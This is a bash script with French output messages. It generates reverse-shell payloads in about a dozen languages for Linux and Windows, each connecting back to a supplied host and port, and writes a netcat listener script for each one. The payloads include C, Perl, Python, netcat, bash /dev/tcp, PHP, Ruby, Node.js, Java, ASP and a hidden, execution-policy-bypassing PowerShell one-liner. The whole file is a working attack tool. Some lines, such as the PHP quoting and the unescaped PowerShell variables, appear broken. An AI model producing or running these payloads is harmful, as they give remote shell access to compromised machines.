#!/usr/bin/env bash
set -euo pipefail

if [ $# -ne 3 ]; then
  echo "Usage: $0 <TARGET_IP> <PORT_START> <OUTPUT_DIR>"
  exit 1
fi

TARGET="$1"
PORT="$2"
OUTDIR="$3"

linux_formats=(c perl python netcat bash php_exec php_fsock ruby nodejs java)
windows_formats=(c perl python netcat bash php asp powershell)

declare -A EXT_LINUX=(
  [c]=c [perl]=pl [python]=py [netcat]=sh [bash]=sh
  [php_exec]=php [php_fsock]=php [ruby]=rb [nodejs]=js [java]=java
)
declare -A EXT_WINDOWS=(
  [c]=c [perl]=pl [python]=py [netcat]=bat [bash]=bat
  [php]=php [asp]=asp [powershell]=ps1
)

mkdir -p "$OUTDIR/linux" "$OUTDIR/windows"

make_listener() {
  local port="$1"; local path="$2"
  echo "#!/usr/bin/env bash" > "$path"
  echo "nc -lnvp $port" >> "$path"
  chmod +x "$path"
}

for fmt in "${linux_formats[@]}"; do
  p="$PORT"; ext="${EXT_LINUX[$fmt]}"
  out="$OUTDIR/linux/rev_${fmt}.${ext}"
  case "$fmt" in
    c)
      cat > "$out" <<'EOF'
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
int main(){
    struct sockaddr_in sa;
    int s=socket(AF_INET,SOCK_STREAM,0);
    sa.sin_family=AF_INET;
    sa.sin_port=htons(PLACEHOLDER_PORT);
    sa.sin_addr.s_addr=inet_addr("PLACEHOLDER_TARGET");
    connect(s,(struct sockaddr*)&sa,sizeof(sa));
    dup2(s,0);dup2(s,1);dup2(s,2);
    execl("/bin/sh","sh",NULL);
    return 0;
}
EOF
      sed -i "s/PLACEHOLDER_PORT/$p/" "$out"
      sed -i "s/PLACEHOLDER_TARGET/$TARGET/" "$out"
      gcc -static -O2 -s -o "$OUTDIR/linux/rev_c.bin" "$out"
      ;;
    perl)
      cat > "$out" <<EOF
#!/usr/bin/perl
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton("$TARGET")))){
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
  exec("/bin/sh -i");
};
EOF
      chmod +x "$out"
      ;;
    python)
      cat > "$out" <<EOF
#!/usr/bin/env python3
import socket,os,pty
s=socket.socket()
s.connect(("$TARGET",$p))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
EOF
      chmod +x "$out"
      ;;
    netcat)
      cat > "$out" <<EOF
#!/usr/bin/env bash
nc "$TARGET" $p -e /bin/sh
EOF
      chmod +x "$out"
      ;;
    bash)
      cat > "$out" <<EOF
#!/usr/bin/env bash
bash -i >& /dev/tcp/"$TARGET"/$p 0>&1
EOF
      chmod +x "$out"
      ;;
    php_exec)
      cat > "$out" <<EOF
<?php
exec("/bin/sh -c 'bash -i >& /dev/tcp/$TARGET/$p 0>&1'");
?>
EOF
      ;;
    php_fsock)
      cat > "$out" <<EOF
<?php
\$sock=fsockopen("$TARGET",$p);
if(\$sock){
  while(!feof(\$sock)){
    \$data=fgets(\$sock,128);
    \$proc=popen(\$data,"r");
    while(!feof(\$proc)){
      fwrite(\$sock,fgets(\$proc,128));
    }
    pclose(\$proc);
  }
  fclose(\$sock);
}
?>
EOF
      ;;
    ruby)
      cat > "$out" <<EOF
#!/usr/bin/env ruby
require 'socket'
s=TCPSocket.open("$TARGET",$p)
while(cmd=s.gets)
  IO.popen(cmd,"r"){|io| s.print io.read }
end
EOF
      chmod +x "$out"
      ;;
    nodejs)
      cat > "$out" <<EOF
#!/usr/bin/env node
const net = require('net'), cp = require('child_process');
const c = net.connect($p, '$TARGET', ()=> {
  const sh = cp.spawn('/bin/sh', []);
  c.pipe(sh.stdin);
  sh.stdout.pipe(c);
  sh.stderr.pipe(c);
});
EOF
      chmod +x "$out"
      ;;
    java)
      cat > "$out" <<EOF
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
public class Shell {
  public static void main(String[] args)throws Exception{
    Socket s=new Socket("$TARGET",$p);
    Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()){
      while(pi.available()>0)so.write(pi.read());
      while(pe.available()>0)so.write(pe.read());
      while(si.available()>0)po.write(si.read());
      so.flush();po.flush();
      Thread.sleep(50);
    }
    p.destroy();s.close();
  }
}
EOF
      ;;
  esac
  make_listener "$p" "$OUTDIR/linux/rev_${fmt}.${ext}.listener.sh"
  PORT=$((PORT+1))
done

for fmt in "${windows_formats[@]}"; do
  p="$PORT"; ext="${EXT_WINDOWS[$fmt]}"
  out="$OUTDIR/windows/rev_${fmt}.${ext}"
  case "$fmt" in
    c)
      cat > "$out" <<EOF
#include <winsock2.h>
#include <windows.h>
int main(){
    WSADATA w; SOCKET s; struct sockaddr_in sa;
    WSAStartup(MAKEWORD(2,2),&w);
    s=socket(AF_INET,SOCK_STREAM,0);
    sa.sin_family=AF_INET;sa.sin_port=htons($p);
    sa.sin_addr.s_addr=inet_addr("$TARGET");
    connect(s,(struct sockaddr*)&sa,sizeof(sa));
    STARTUPINFO si;PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES;
    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
    return 0;
}
EOF
      ;;
    perl)
      cat > "$out" <<EOF
#!/usr/bin/perl
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton("$TARGET")))){
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
  exec("cmd.exe");
};
EOF
      chmod +x "$out"
      ;;
    python)
      cat > "$out" <<EOF
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket();s.connect(("$TARGET",$p))
for fd in (0,1,2):os.dup2(s.fileno(),fd)
subprocess.call(["cmd.exe"])
EOF
      chmod +x "$out"
      ;;
    netcat)
      cat > "$out" <<EOF
@echo off
nc.exe "$TARGET" $p -e cmd.exe
EOF
      ;;
    bash)
      cat > "$out" <<EOF
@echo off
rem nécessite Git Bash ou WSL
bash -i >& /dev/tcp/"$TARGET"/$p 0>&1
EOF
      ;;
    php)
      cat > "$out" <<EOF
<?php
exec("cmd.exe /C "powershell -NoP -Exec Bypass -Command \"bash -i >& /dev/tcp/$TARGET/$p 0>&1\""");
?>
EOF
      ;;
    asp)
      cat > "$out" <<EOF
<%
Set sock=CreateObject("MSWinsock.Winsock")
sock.RemoteHost="$TARGET":sock.RemotePort=$p:sock.Connect
Set sh=CreateObject("WScript.Shell")
Do While sock.Connected
  If Not sh.StdOut.AtEndOfStream Then sock.SendData(sh.StdOut.ReadAll)
  If sock.BytesReceived>0 Then sh.StdIn.Write sock.ReceiveData
  WScript.Sleep 50
Loop
%>
EOF
      ;;
    powershell)
      cat > "$out" <<EOF
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('$TARGET',$p);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$s.Write((New-Object Text.ASCIIEncoding).GetBytes($r),0,$r.Length)};$c.Close()"
EOF
      ;;
  esac
  make_listener "$p" "$OUTDIR/windows/rev_${fmt}.${ext}.listener.sh"
  PORT=$((PORT+1))
done

echo "✅ Génération complète dans '$OUTDIR/'"
